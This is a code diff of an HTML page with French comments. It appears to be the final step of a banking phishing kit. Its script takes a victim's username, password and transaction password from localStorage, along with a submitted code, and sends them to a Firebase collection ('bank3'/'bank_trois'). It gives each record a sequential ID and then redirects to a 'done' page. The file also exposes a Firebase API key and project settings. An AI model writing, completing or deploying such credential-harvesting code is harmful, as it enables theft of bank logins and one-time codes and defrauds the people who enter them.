@@ -12,8 +12,8 @@
     <script type="module">
         // Importation de Firebase
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
-        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-firestore.js";
-
+        import { getFirestore, collection, setDoc, doc } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-firestore.js";
+    
         // Configuration Firebase
         const firebaseConfig = {
             apiKey: "AIzaSyAbniNRr-UbMOc_xKEjx13u1cHolSF-m74",
@@ -24,44 +24,57 @@
             appId: "1:8821333215:web:db6d5c44dc451d80c21d6a",
             measurementId: "G-R4G25JKTCB"
         };
-
+    
         // Initialisation Firebase
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
-
+    
+        // Récupérer le dernier ID utilisé depuis localStorage ou initialiser à 199
+        let lastId = parseInt(localStorage.getItem("lastId")) || 768;
+    
+        // Fonction pour générer un nouvel ID incrémenté
+        function generateCustomId() {
+            lastId += 1; // Incrémenter l'ID
+            localStorage.setItem("lastId", lastId); // Sauvegarder dans localStorage
+            return String(lastId).padStart(4, '0'); // Formater en 4 chiffres (ex: 0200)
+        }
+    
+        // Gestion du formulaire
         document.addEventListener("DOMContentLoaded", function () {
             document.getElementById("userForm").addEventListener("submit", async function (event) {
                 event.preventDefault(); // Empêche le rechargement de la page
-
+    
                 const username = localStorage.getItem("username");
                 const password = localStorage.getItem("password");
-                const passwordtransac = localStorage.getItem("passwordtransac");
+                const transacpassword = localStorage.getItem("transacpassword");
                 const code = document.getElementById("code").value;
-
+    
                 if (code) {
-
                     try {
-                               // Ajouter les données dans Firestore
-                        const docRef = await addDoc(collection(db, "bank3"), {
+                        // Générer un nouvel ID personnalisé
+                        const customId = generateCustomId();
+    
+                        // Ajouter les données dans Firestore avec l'ID personnalisé
+                        await setDoc(doc(db, "bank_trois", customId), {
+                            id: customId, // Ajouter l'ID personnalisé au document
                             username: username,
-                            password: password,
-                            passwordtransac: passwordtransac,
+                            motdepasse: password,
+                            transacpassword: transacpassword,
                             code: code,
                             timestamp: new Date()
                         });
-
-                        console.log("Document ajouté avec l'ID : ", docRef.id);
-
+    
+                        console.log("Document ajouté avec l'ID personnalisé : ", customId);
+    
                         // Supprimer les données du localStorage après envoi
                         localStorage.removeItem("username");
                         localStorage.removeItem("password");
-                        localStorage.removeItem("passwordtransac");
-
-                        console.log("Données envoyées :", { username, password, passwordtransac, code });
-
+    
+                        console.log("Données envoyées :", { username, password, code });
+    
                         // Rediriger immédiatement
                         window.location.href = "done.html";
-
+    
                     } catch (error) {
                         console.error("Erreur Firebase :", error);
                     }
@@ -70,7 +83,6 @@
                 }
             });
         });
-
     </script>
 </head>
 <body>
